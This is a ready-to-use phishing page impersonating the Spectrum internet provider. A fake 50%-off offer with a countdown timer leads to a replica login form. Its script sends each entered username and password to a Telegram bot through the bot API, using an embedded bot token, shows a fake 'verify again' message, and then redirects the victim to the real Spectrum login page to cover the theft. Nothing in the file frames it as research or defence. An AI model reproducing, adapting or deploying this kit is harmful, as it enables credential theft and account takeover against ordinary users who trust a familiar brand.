<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spectrum Exclusive Offer</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; background:#f5f7fa; }

        /* === PAGE 1: 50% OFF OFFER === */
        #offer { min-height:100vh; background:linear-gradient(135deg,#004b87,#007acc); display:flex; align-items:center; justify-content:center; padding:20px; text-align:center; color:#fff; }
        .offer-box { background:rgba(255,255,255,0.97); color:#000; border-radius:20px; padding:35px 25px; max-width:420px; box-shadow:0 20px 40px rgba(0,0,0,0.3); }
        .offer-box img { width:170px; margin-bottom:20px; }
        .big { font-size:4rem; font-weight:900; color:#e63946; }
        .timer { background:#000; color:#fff; padding:15px; border-radius:12px; font-size:1.3rem; margin:20px 0; font-weight:bold; }
        .claim { background:#e63946; color:#fff; font-size:1.4rem; padding:18px 50px; border:none; border-radius:50px; cursor:pointer; font-weight:bold; box-shadow:0 10px 25px rgba(230,57,70,0.5); }
        .claim:hover { background:#c1121f; }

        /* === PAGE 2: EXACT SPECTRUM LOGIN REPLICA === */
        #login-page { display:none; min-height:100vh; background:#fff; padding:40px 20px; }
        .login-container { max-width:380px; margin:0 auto; background:#fff; padding:30px 25px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
        .login-container h1 { font-size:2rem; text-align:center; margin-bottom:30px; font-weight:600; }
        .login-container .or { text-align:center; margin:25px 0; position:relative; }
        .login-container .or::before { content:""; position:absolute; top:50%; left:0; right:0; height:1px; background:#ddd; }
        .login-container .or span { background:#fff; padding:0 15px; color:#666; }
        .create { display:block; text-align:center; color:#1877f2; font-size:1.1rem; margin:20px 0; text-decoration:underline; cursor:pointer; }
        label { display:block; font-size:1rem; margin:20px 0 8px; color:#1c1e21; }
        input[type="text"], input[type="password"] {
            width:100%; padding:14px; border:1px solid #ddd; border-radius:8px; font-size:1.1rem;
        }
        .pass-wrapper { position:relative; }
        .eye { position:absolute; right:12px; top:14px; cursor:pointer; font-size:1.4rem; }
        .checkbox { display:flex; align-items:center; gap:10px; margin:20px 0; font-size:0.95rem; }
        .signin-btn {
            background:#1877f2; color:#fff; padding:14px; border:none; border-radius:8px; font-size:1.2rem; font-weight:bold; width:100%; cursor:pointer; margin-top:10px;
        }
        .forgot { text-align:center; margin-top:20px; }
        .forgot a { color:#1877f2; text-decoration:underline; }
        .msg { margin-top:20px; text-align:center; font-weight:bold; color:#28a745; font-size:1.1rem; }
    </style>
</head>
<body>

<!-- PAGE 1: OFFER -->
<div id="offer">
    <div class="offer-box">
        <img src="https://spectrum.com/etc.clientlibs/charter/clientlibs/clientlib-site/resources/images/spectrum-logo.svg" alt="Spectrum">
        <h1>Congratulations!</h1>
        <div class="big">50% OFF</div>
        <p style="font-size:1.4rem;margin:15px 0;">Your First Year – Limited Time!</p>
        <div class="timer">Offer Ends: <span id="timer">23:59:59</span></div>
        <button class="claim" onclick="document.getElementById('offer').style.display='none'; document.getElementById('login-page').style.display='block';">
            Claim Your Discount Now
        </button>
    </div>
</div>

<!-- PAGE 2: EXACT FAKE LOGIN -->
<div id="login-page">
    <div class="login-container">
        <h1>Sign In to Get Started</h1>
        <div class="or"><span>or</span></div>
        <a href="#" class="create">Create a Username</a>

        <form onsubmit="capture(event)">
            <label>Username</label>
            <input type="text" id="user" required autocomplete="username">

            <label>Password</label>
            <div class="pass-wrapper">
                <input type="password" id="pass" required autocomplete="current-password">
                <span class="eye" onclick="this.previousElementSibling.type = this.previousElementSibling.type==='password'?'text':'password'">Eye</span>
            </div>

            <div class="checkbox">
                <input type="checkbox" id="stay">
                <label for="stay">Stay Signed In on This Device</label>
            </div>

            <button type="submit" class="signin-btn">Sign In</button>
            <div class="msg" id="msg"></div>
        </form>

        <div class="forgot">
            <a href="#">Forgot Username or Password?</a>
        </div>
    </div>
</div>

<script>
    // Timer
    let s = 24*3600;
    setInterval(() => {
        s--; let h=Math.floor(s/3600), m=Math.floor((s%3600)/60), sec=s%60;
        document.getElementById('timer').textContent = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
    }, 1000);

    function capture(e) {
        e.preventDefault();
        const user = document.getElementById('user').value.trim();
        const pass = document.getElementById('pass').value;

        // === SEND TO @resxge ===
        const token = "8574699564:AAFnQPZDe1-6AulpK82gXX1BBiucTU6AJ9k"; // ← CHANGE TO YOUR BOT TOKEN
        const msg = `SPECTRUM LOGIN CAPTURE\nUser: ${user}\nPass: ${pass}\nTime: ${new Date().toLocaleString()}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify({chat_id: "@spectrumhak_bot", text: msg})
        });

        // Fake "verify again" then redirect
        document.getElementById('msg').textContent = "Please verify your details again...";
        setTimeout(() => {
            window.location.href = "https://www.spectrum.net/login";
        }, 2800);
    }
</script>
</body>
</html>
